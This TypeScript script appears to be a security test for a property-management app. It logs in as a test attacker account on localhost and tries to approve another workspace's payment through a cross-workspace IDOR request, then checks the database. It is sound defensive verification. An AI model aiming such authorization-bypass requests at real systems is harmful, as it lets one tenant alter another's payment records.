import 'dotenv/config';
import { createClient } from '@supabase/supabase-js';
import { PrismaClient } from '@prisma/client';

const supabase = createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_ANON_KEY!);
const prisma = new PrismaClient();

const ATTACKER_EMAIL = 'attacker@sec-test.com';
const PASSWORD = 'SecTestPassword123!';

async function run() {
  console.log('--- Verifying IDOR: Payment Review ---');

  const attackerWorkspace = await prisma.workspace.findFirst({ where: { name: 'SEC_TEST_ATTACKER_WS' } });
  const victimPayment = await prisma.payment.findFirst({ 
    where: { lease: { property: { name: 'Victim Property' } } } 
  });

  if (!attackerWorkspace || !victimPayment) {
    console.error('Setup data not found. Run setup.ts first.');
    return;
  }

  // 1. Sign in as Attacker PM
  const { data: auth, error: loginError } = await supabase.auth.signInWithPassword({
    email: ATTACKER_EMAIL,
    password: PASSWORD,
  });

  if (loginError) {
    console.error('Login failed:', loginError.message);
    return;
  }

  const token = auth.session.access_token;
  const baseUrl = 'http://localhost:3001';

  // 2. Attempt to approve VICTIM payment using ATTACKER workspace ID in URL
  console.log(`Targeting Victim Payment: ${victimPayment.id}`);
  console.log(`Using Attacker Workspace: ${attackerWorkspace.id}`);

  const payload = {
    status: 'PAID'
  };

  const response = await fetch(`${baseUrl}/api/workspaces/${attackerWorkspace.id}/payments/${victimPayment.id}/review`, {
    method: 'PATCH',
    headers: {
      'Authorization': `Bearer ${token}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  });

  const result = await response.json();

  if (response.status === 200) {
    console.log('✅ VULNERABILITY CONFIRMED: Payment review successful across workspace boundaries!');
    console.log('Response:', JSON.stringify(result, null, 2));
    
    // Verify in DB
    const updatedPayment = await prisma.payment.findUnique({ where: { id: victimPayment.id } });
    if (updatedPayment?.status === 'PAID') {
      console.log('📊 DATABASE VERIFICATION: Payment status changed to PAID.');
    }
  } else {
    console.log(`❌ VULNERABILITY NOT EXPLOITED: Status ${response.status}`);
    console.log('Response:', JSON.stringify(result, null, 2));
  }

  await prisma.$disconnect();
}

run();
